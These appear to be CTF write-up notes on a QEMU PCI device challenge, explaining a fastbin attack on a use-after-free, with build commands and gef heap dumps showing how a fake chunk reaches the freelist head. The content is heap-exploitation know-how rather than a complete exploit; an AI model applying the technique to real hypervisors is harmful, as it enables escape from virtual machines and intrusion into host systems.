## Compile pcimem
musl-gcc  -static pcimem.c -o pcimem

## repacke fs
find . | cpio -H newc -o > ../initramfs-busybox-x86_64.cpio
gzip initramfs-busybox-x86_64.cpio

WE can use fastbin attack to exploit UAF.

When you debug the program, you'll find it doesn't use the main_arena.
```
gef➤  p (struct malloc_state)*0x7eff88000020
$5 = {
  mutex = 0x0, 
  flags = 0x2, 
  fastbinsY = {0x7eff88441cd0, 0x7eff881fa940, 0x7eff881fa9c0, 0x7eff88441d40, 0x0, 0x7eff88204000, 0x7eff8828e140, 0x0, 0x0, 0x0}, 
  top = 0x7eff8870edf0, 
  last_remainder = 0x7eff881ff7a0, 
  bins = {0x7eff881ff7a0, 0x7eff881ff7a0...
  ......

gef➤  x/10gx 0x1317940
0x1317940:	0x0000000000000000	0x0000000000000000
0x1317950:	0x0000000000000000	0x0000000000000000
0x1317960:	0x0000000000000000	0x0000000000000000
0x1317970:	0x00007eff881ff480	0x0000000000000000
0x1317980:	0x0000000000000000	0x0000000000000000
```
We passed the size 100\*8(0x320), making the chunk cut from the unsorted bin at 0x7eff881ff480. So we can satisfy the size check of fastbin malloc. If using the main_arena, I think it's hard to solve this.

After we free the memory, we know the chunk will be added at the first place in the freelist(another debug session). 
```
gef➤  x/16gx 0x1317940
0x1317940:	0x0000000000000000	0x0000000000000000
0x1317950:	0x0000000000000000	0x0000000000000000
0x1317960:	0x0000000000000000	0x0000000000000000
0x1317970:	0x00007f959c24b7d0	0x0000000000000000
0x1317980:	0x0000000000000000	0x0000000000000000
0x1317990:	0x0000000000000000	0x0000000000000000
0x13179a0:	0x0000000000000000	0x0000000000000000
0x13179b0:	0x0000000000000000	0x0000000000000000
gef➤  heapinfo
(0x20)     fastbin[0]: 0x7f959c6c24d0 --> 0x7f959c6c2410 --> 0x0
(0x30)     fastbin[1]: 0x7f959c1ef080 --> 0x7f959c1eefc0 --> 0x7f959c1eef00 --> 0x7f959c1eee40 --> 0x7f959c32ecc0 --> 0x7f959c32ec00 --> 0x7f959c6a8ac0 --> 0x7f959c6a8a00 --> 0x7f959c6111c0 --> 0x7f959c1ff700 --> 0x0
(0x40)     fastbin[2]: 0x7f959c1ef100 --> 0x7f959c1ef040 --> 0x7f959c1eef80 --> 0x7f959c1eeec0 --> 0x7f959c32ed40 --> 0x7f959c32ec80 --> 0x7f959c6a8b40 --> 0x7f959c6a8a80 --> 0x7f959c1ff780 --> 0x0
(0x50)     fastbin[3]: 0x7f959c201ca0 --> 0x7f959c201be0 --> 0x7f959c201b20 --> 0x7f959c6c2540 --> 0x7f959c6c2480 --> 0x7f959c611120 --> 0x7f959c611060 --> 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x7f959c24b7c0 --> 0x7f959c320f00 --> ......
```
When you allocate another chunk:
```
gef➤  x/16gx 0x1317940
0x1317940:	0x00007f959c22e510	0x0000000000000000
0x1317950:	0x0000000000000000	0x0000000000000000
0x1317960:	0x0000000000000000	0x0000000000000000
0x1317970:	0x00007f959c24b7d0	0x0000000000000000
0x1317980:	0x0000000000000000	0x0000000000000000
0x1317990:	0x0000000000000000	0x0000000000000000
0x13179a0:	0x0000000000000000	0x0000000000000000
0x13179b0:	0x0000000000000000	0x0000000000000000
gef➤  heapinfo
(0x20)     fastbin[0]: 0x7f959c6c24d0 --> 0x7f959c6c2410 --> 0x0
(0x30)     fastbin[1]: 0x7f959c1ef080 --> 0x7f959c1eefc0 --> 0x7f959c1eef00 --> 0x7f959c1eee40 --> 0x7f959c32ecc0 --> 0x7f959c32ec00 --> 0x7f959c6a8ac0 --> 0x7f959c6a8a00 --> 0x7f959c6111c0 --> 0x7f959c1ff700 --> 0x0
(0x40)     fastbin[2]: 0x7f959c1ef100 --> 0x7f959c1ef040 --> 0x7f959c1eef80 --> 0x7f959c1eeec0 --> 0x7f959c32ed40 --> 0x7f959c32ec80 --> 0x7f959c6a8b40 --> 0x7f959c6a8a80 --> 0x7f959c1ff780 --> 0x0
(0x50)     fastbin[3]: 0x7f959c201ca0 --> 0x7f959c201be0 --> 0x7f959c201b20 --> 0x7f959c6c2540 --> 0x7f959c6c2480 --> 0x7f959c611120 --> 0x7f959c611060 --> 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x7f959c22e440 --> 0x7f959c347940 --> 0x7f959c347880 --> 0x7f959c3477c0 --> 0x7f959c347700 --> 0x7f959c347640 --> 0x7f959c1f4140 --> 0x7f959c1f4080 --> 0x7f959c1f3fc0 --> 0x7f959c1f3f00 --> 0x7f959c1f3e40 --> 0x7f959c5f4540 --> 0x7f959c5f4480 --> 0x7f959c5f43c0 --> 0x7f959c5f4300 --> 0x7f959c5f4240 --> 0x7f959c1d1b40 --> 0x7f959c1d1a80 --> 0x7f959c1d19c0 --> 0x7f959c1d1900 --> 0x7f959c1d1840 --> 0x7f959c321140 --> 0x7f959c321080 --> 0x7f959c320fc0 --> 0x7f959c24b7c0 --> 0x131796d (size error (0x78)) --> 0x0
```
See? We can't control it. After I see the wp from [here](https://uaf.io/exploitation/2018/05/13/DefconQuals-2018-EC3.html), I get the point: Qemu will often allocate our fake chunk somewhere before us if we take too much time or it will free a bunch of other same sized buffers which will move our fake pointer from the top of the free list. You must overcome this by allocating multi chunks continuously and quickly, and if you debug the program, you can't get the fake pointer I guess.

```
gef➤  x/16gx 0x1317940
0x1317940:	0x00007f0ec83bb050	0x00007f0ec8198c90
0x1317950:	0x000000000131797d	0x00007f0ec8328a80
0x1317960:	0x0000000000000000	0x0000000000000000
0x1317970:	0x00007f0ec8198c90	0x0000000000000000
0x1317980:	0x0000000000000000	0x0000000000000000
0x1317990:	0x0000000000000000	0x0000000000000000
0x13179a0:	0x0000000000000000	0x0000000000000000
0x13179b0:	0x0000000000000000	0x0000000000000000
```

The tech is interesting, just like heap spray a little. And it's more practical in real exploit.